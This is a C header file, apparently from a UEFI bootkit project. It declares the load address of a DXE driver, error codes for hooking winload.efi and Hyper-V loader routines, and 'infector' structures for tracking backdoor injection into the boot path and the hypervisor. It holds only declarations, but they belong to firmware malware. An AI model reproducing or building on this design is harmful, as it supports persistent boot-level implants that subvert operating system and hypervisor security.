
#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

// physical address where DXE driver will be loaded
#define BACKDOOR_ADDR 0x10000

// error codes
#define BACKDOOR_ERR_WINLOAD                 ((UINT64)-1) // winload.efi not found
#define BACKDOOR_ERR_BELOW_1MB_NOT_FOUND     ((UINT64)-2) // winload!HvlpBelow1MbPage not found
#define BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED ((UINT64)-3) // winload!HvlpBelow1MbPage not allocated
#define BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR  ((UINT64)-4) // winload!HvlpTransferToHypervisor() not found
#define BACKDOOR_ERR_LOW_MEMORY_STUB         ((UINT64)-5) // winload!HvlpLowMemoryStub() not found

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryInfected;
    UINT64 LocateProtocol;
    UINT64 SystemTable;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _INFECTOR_STATUS
{
    UINT64 Success;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

typedef struct _HV_INFO
{
    UINT64 Success;
    UINT64 WinloadPageTable;
    UINT64 HvPageTable;
    UINT64 HvEntry;
    UINT64 HvVmExit;

} HV_INFO,
*PHV_INFO;

#pragma pack()

// physical address of INFECTOR_STATUS
#define STATUS_ADDR (0x1000 - sizeof(INFECTOR_STATUS))

// physical address of HV_INFO
#define HV_INFO_ADDR (0x1000 - sizeof(INFECTOR_STATUS) - sizeof(HV_INFO))

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

void ConsolePrint(char *Message);

#endif
